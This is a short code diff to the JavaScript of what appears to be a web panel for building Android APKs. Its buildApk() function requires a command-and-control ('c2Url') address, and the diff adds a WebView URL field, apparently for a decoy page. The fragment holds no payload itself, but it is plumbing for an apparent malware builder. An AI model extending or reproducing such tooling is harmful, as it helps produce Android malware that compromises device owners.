@@ -17,6 +17,7 @@ function switchTab(tab) {
 function buildApk() {
     const apkName = document.getElementById('apkName').value.trim();
     const appLabel = document.getElementById('appLabel').value.trim();
+    const webviewUrl = document.getElementById('webviewUrl').value.trim();
     const c2Url = document.getElementById('c2Url').value.trim();
     
     if (!c2Url) {
@@ -47,6 +48,7 @@ function buildApk() {
     const params = new URLSearchParams({
         apkName: apkName,
         appLabel: appLabel,
+        webviewUrl: webviewUrl,
         c2Url: c2Url
     });
 
